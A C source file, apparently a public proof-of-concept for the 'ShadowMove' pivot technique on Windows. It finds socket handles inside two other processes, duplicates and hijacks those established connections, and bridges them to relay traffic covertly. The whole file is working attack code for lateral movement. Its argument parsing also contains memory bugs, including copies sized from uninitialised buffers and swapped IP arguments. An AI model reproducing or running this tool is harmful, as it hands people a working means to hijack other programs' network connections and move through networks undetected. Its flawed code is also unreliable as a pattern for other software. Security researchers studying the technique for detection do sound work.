// PoC of ShadowMove Pivot by Juan Manuel Fernández (@TheXC3LL) 

#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <winsock2.h>
#include <Windows.h>
#include <stdio.h>

#pragma comment(lib,"WS2_32")

// Most of the code is adapted from https://github.com/Zer0Mem0ry/WindowsNT-Handle-Scanner/blob/master/FindHandles/main.cpp
#define STATUS_INFO_LENGTH_MISMATCH 0xc0000004
#define SystemHandleInformation 16
#define ObjectNameInformation 1
#define MSG_END_OF_TRANSMISSION "\x31\x41\x59\x26\x53\x58\x97\x93\x23\x84"
#define BUFSIZE 65536

typedef NTSTATUS(NTAPI* _NtQuerySystemInformation)(
	ULONG SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
	);
typedef NTSTATUS(NTAPI* _NtDuplicateObject)(
	HANDLE SourceProcessHandle,
	HANDLE SourceHandle,
	HANDLE TargetProcessHandle,
	PHANDLE TargetHandle,
	ACCESS_MASK DesiredAccess,
	ULONG Attributes,
	ULONG Options
	);
typedef NTSTATUS(NTAPI* _NtQueryObject)(
	HANDLE ObjectHandle,
	ULONG ObjectInformationClass,
	PVOID ObjectInformation,
	ULONG ObjectInformationLength,
	PULONG ReturnLength
	);

typedef struct _SYSTEM_HANDLE {
	ULONG ProcessId;
	BYTE ObjectTypeNumber;
	BYTE Flags;
	USHORT Handle;
	PVOID Object;
	ACCESS_MASK GrantedAccess;
} SYSTEM_HANDLE, * PSYSTEM_HANDLE;

typedef struct _SYSTEM_HANDLE_INFORMATION {
	ULONG HandleCount;
	SYSTEM_HANDLE Handles[1];
} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;

typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR Buffer;
} UNICODE_STRING, * PUNICODE_STRING;


typedef enum _POOL_TYPE {
	NonPagedPool,
	PagedPool,
	NonPagedPoolMustSucceed,
	DontUseThisType,
	NonPagedPoolCacheAligned,
	PagedPoolCacheAligned,
	NonPagedPoolCacheAlignedMustS
} POOL_TYPE, * PPOOL_TYPE;

typedef struct _OBJECT_NAME_INFORMATION {
	UNICODE_STRING Name;
} OBJECT_NAME_INFORMATION, * POBJECT_NAME_INFORMATION;

PVOID GetLibraryProcAddress(PSTR LibraryName, PSTR ProcName) {
	return GetProcAddress(GetModuleHandleA(LibraryName), ProcName);
}



SOCKET findTargetSocket(DWORD dwProcessId, LPSTR dstIP) {
	HANDLE hProc;
	PSYSTEM_HANDLE_INFORMATION handleInfo;
	DWORD handleInfoSize = 0x10000;
	NTSTATUS status;
	DWORD returnLength;
	WSAPROTOCOL_INFOW wsaProtocolInfo = { 0 };
	SOCKET targetSocket;

	// Open target process with PROCESS_DUP_HANDLE rights
	hProc = OpenProcess(PROCESS_DUP_HANDLE, FALSE, dwProcessId);
	if (!hProc) {
		printf("[!] Error: could not open the process!\n");
		exit(-1);
	}
	printf("[+] Handle to process obtained!\n");

	// Find the functions
	_NtQuerySystemInformation NtQuerySystemInformation = (_NtQuerySystemInformation)GetLibraryProcAddress("ntdll.dll", "NtQuerySystemInformation");
	_NtDuplicateObject NtDuplicateObject = (_NtDuplicateObject)GetLibraryProcAddress("ntdll.dll", "NtDuplicateObject");
	_NtQueryObject NtQueryObject = (_NtQueryObject)GetLibraryProcAddress("ntdll.dll", "NtQueryObject");

	// Retrieve handles from the target process
	handleInfo = (PSYSTEM_HANDLE_INFORMATION)malloc(handleInfoSize);
	while ((status = NtQuerySystemInformation(SystemHandleInformation, handleInfo, handleInfoSize, NULL)) == STATUS_INFO_LENGTH_MISMATCH)
		handleInfo = (PSYSTEM_HANDLE_INFORMATION)realloc(handleInfo, handleInfoSize *= 2);

	printf("[+] Found [%d] handlers in PID %d\n============================\n", handleInfo->HandleCount, dwProcessId);

	// Iterate 
	for (DWORD i = 0; i < handleInfo->HandleCount; i++) {

		// Check if it is the desired type of handle
		if (handleInfo->Handles[i].ObjectTypeNumber == 0x24) {

			SYSTEM_HANDLE handle = handleInfo->Handles[i];
			HANDLE dupHandle = NULL;
			POBJECT_NAME_INFORMATION objectNameInfo;

			// Dupplicate handle
			NtDuplicateObject(hProc, (HANDLE)handle.Handle, GetCurrentProcess(), &dupHandle, PROCESS_ALL_ACCESS, FALSE, DUPLICATE_SAME_ACCESS);
			objectNameInfo = (POBJECT_NAME_INFORMATION)malloc(0x1000);

			// Get handle info
			NtQueryObject(dupHandle, ObjectNameInformation, objectNameInfo, 0x1000, &returnLength);

			// Narrow the search checking if the name length is correct (len(\Device\Afd) == 11 * 2)
			if (objectNameInfo->Name.Length == 22) {
				printf("[-] Testing %d of %d\n", i, handleInfo->HandleCount);

				// Check if it ends in "Afd"
				LPWSTR needle = (LPWSTR)malloc(8);
				memcpy(needle, objectNameInfo->Name.Buffer + 8, 6);
				if (needle[0] == 'A' && needle[1] == 'f' && needle[2] == 'd') {

					// We got a candidate
					printf("\t[*] \\Device\\Afd found at %d!\n", i);

					// Try to duplicate the socket
					status = WSADuplicateSocketW((SOCKET)dupHandle, GetCurrentProcessId(), &wsaProtocolInfo);
					if (status != 0) {
						printf("\t\t[X] Error duplicating socket!\n");
						free(needle);
						free(objectNameInfo);
						CloseHandle(dupHandle);
						continue;
					}

					// We got it?
					targetSocket = WSASocket(wsaProtocolInfo.iAddressFamily, wsaProtocolInfo.iSocketType, wsaProtocolInfo.iProtocol, &wsaProtocolInfo, 0, WSA_FLAG_OVERLAPPED);
					if (targetSocket != INVALID_SOCKET) {
						struct sockaddr_in sockaddr;
						DWORD len;
						len = sizeof(SOCKADDR_IN);

						// It this the socket?
						if (getpeername(targetSocket, (SOCKADDR*)&sockaddr, &len) == 0) {
							if (strcmp(inet_ntoa(sockaddr.sin_addr), dstIP) == 0) {
								printf("\t[*] Duplicated socket (%s)\n", inet_ntoa(sockaddr.sin_addr));
								free(needle);
								free(objectNameInfo);
								return targetSocket;
							}
						}

					}

					free(needle);
				}

			}
			free(objectNameInfo);

		}
	}

	return 0;
}

// Reused from MSSQLPROXY https://github.com/blackarrowsec/mssqlproxy/blob/master/reciclador/reciclador.cpp
void bridge(SOCKET fd0, SOCKET fd1) {
	int maxfd, ret;
	fd_set rd_set;
	size_t nread;
	char buffer_r[BUFSIZE];
	maxfd = (fd0 > fd1) ? fd0 : fd1;
	while (1) {
		FD_ZERO(&rd_set);
		FD_SET(fd0, &rd_set);
		FD_SET(fd1, &rd_set);
		ret = select(maxfd + 1, &rd_set, NULL, NULL, NULL);
		if (ret < 0 && errno == EINTR) {
			continue;
		}
		if (FD_ISSET(fd0, &rd_set)) {
			nread = recv(fd0, buffer_r, BUFSIZE, 0);
			if (nread <= 0)
				break;
			send(fd1, buffer_r, nread, 0);
		}
		if (FD_ISSET(fd1, &rd_set)) {
			nread = recv(fd1, buffer_r, BUFSIZE, 0);

			if (nread <= 0)
				break;

			// End of transmission
			if (nread >= strlen(MSG_END_OF_TRANSMISSION) && strstr(buffer_r, MSG_END_OF_TRANSMISSION) != NULL) {
				send(fd0, buffer_r, nread - strlen(MSG_END_OF_TRANSMISSION), 0);
				break;
			}

			send(fd0, buffer_r, nread, 0);
		}
	}
}


int main(int argc, char** argv) {
	WORD wVersionRequested;
	WSADATA wsaData;
	DWORD dwProcessIdSrc;
	WORD dwProcessIdDst;
	LPSTR dstIP = NULL;
	LPSTR srcIP = NULL;
	SOCKET srcSocket;
	SOCKET dstSocket;

	printf("\t\t\t-=[ ShadowMove Pivot PoC ]=-\n\n");

	// smpivot.exe [PID src] [PID dst] [IP dst] [IP src]
	/* It's just a PoC, we do not validate the args. But at least check if number of args is right X) */
	if (argc != 5) {
		printf("[!] Error: syntax is %s [PID src] [PID dst] [IP src] [IP dst]\n", argv[0]);
		exit(-1);
	}
	dwProcessIdSrc = strtoul(argv[1], NULL, 10);
	dwProcessIdDst = strtoul(argv[2], NULL, 10);

	dstIP = (LPSTR)malloc(strlen(argv[4]) * (char)+1);
	memcpy(dstIP, argv[3], strlen(dstIP));
	srcIP = (LPSTR)malloc(strlen(argv[3]) * (char)+1);
	memcpy(srcIP, argv[4], strlen(srcIP));

	// Classic
	wVersionRequested = MAKEWORD(2, 2);
	WSAStartup(wVersionRequested, &wsaData);

	srcSocket = findTargetSocket(dwProcessIdSrc, srcIP);

	dstSocket = findTargetSocket(dwProcessIdDst, dstIP);
	if (srcSocket == 0) {
		printf("\n[!] Error: could not attach to source socket");
		return -1;
	}
	printf("\n[<] Attached to SOURCE\n");
	if (dstSocket == 0) {
		printf("\n[!] Error: could not attach to sink socket");
		return -1;
	}
	printf("[>] Attached to SINK\n");
	printf("============================\n[Link up]\n============================\n");
	bridge(srcSocket, dstSocket);
	printf("============================\n[Link down]\n============================\n");
	return 0;
}